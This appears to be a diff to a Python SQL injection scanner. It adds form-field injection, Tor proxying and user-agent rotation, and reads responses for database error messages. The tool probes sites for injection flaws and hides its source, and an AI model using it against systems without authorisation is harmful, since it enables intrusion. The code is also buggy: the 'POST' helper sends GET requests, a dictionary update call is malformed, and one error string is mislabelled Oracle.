@@ -20,21 +20,58 @@ def saveResults(payload, url):
     writer.close()
 
 
+def preparePOSTRequest(port, toruse, url ,data):
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    dir = os.getcwd() + "/user-agents/user-agents.txt"
+    f = open(dir, "r")
+    headers = f.readlines()
+    rd = random.randint(0, len(headers) - 1)
+    header = {"user-agent": headers[rd].strip()}
+    try:
+
+
+        if toruse == "yes":
+            proxies = {'socks5': '127.0.0.1:' + port}
+            r = requests.get(url, headers=header,params=data, proxies=proxies, verify=False)
+        else:
+            r = requests.get(url, headers=header,params=data,  verify=False)
+
+        return r
+    except:
+        return
+
+
+def blindSqlCHeck():
+    pass
+
+
 def runSqliTest(url, payload, toruse, port):
     o = urlparse(url)
     query = parse_qs(o.query)
+    # check if the methode is a GET or POST
     if query != {}:
-        r = prepareRequest(port, toruse, url + payload)
-        basicGetSqliCheck(r,url, payload)
+        r = prepareGetRequest(port, toruse, url + payload)
+        basicSqliCheck(r,url, payload)
+        blindSqlCHeck()
     elif query=={}:
-        print("")
+        r = preparePOSTRequest(port, toruse, url ,{})
+        if r!='':
+           try:
+               soup = BeautifulSoup(r.text, 'html.parser')
+               forms = soup.findAll('input', value=True)
+               data = {}
+               if len(forms) > 0:
+                   for f in forms:
+                       data.update( f["name"], payload)
+                   r2 = preparePOSTRequest(port, toruse, url ,data)
+                   basicSqliCheck(r2, url, payload)
+
+           except:return
 
 
-
-def basicGetSqliCheck(r,url, payload):
+def basicSqliCheck(r,url, payload):
     for rrr in results:
         if rrr.url in url or url in rrr.url:
-            break
             return
 
 
@@ -54,18 +91,18 @@ def basicGetSqliCheck(r,url, payload):
 
             elif ("error in your SQL syntax" in text):
                 print("[+] seems to be vulnerable to SQL injection")
-                print("Possible database system manager: MySQl")
+                print("[+] Possible database system manager: MySQl")
                 saveResults(payload, url)
                 return
 
             elif ("SQL command not properly ended" in text):
                 print("[+] seems to be vulnerable to SQL injection")
-                print("Possible database system manager :Oracle")
+                print("[+] Possible database system manager :Oracle")
                 saveResults(payload, url)
                 return
             elif ("Query failed: ERROR: syntax error at or near" in text):
                 print("[+] seems to be vulnerable to SQL injection")
-                print("Possible database system manager :Oracle")
+                print("[+] Possible database system manager :Oracle")
                 saveResults(payload, url)
                 return
 
@@ -75,7 +112,7 @@ def basicGetSqliCheck(r,url, payload):
             return
 
 
-def prepareRequest(port, toruse, url):
+def prepareGetRequest(port, toruse, url):
     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     dir = os.getcwd() + "/user-agents/user-agents.txt"
     f = open(dir, "r")
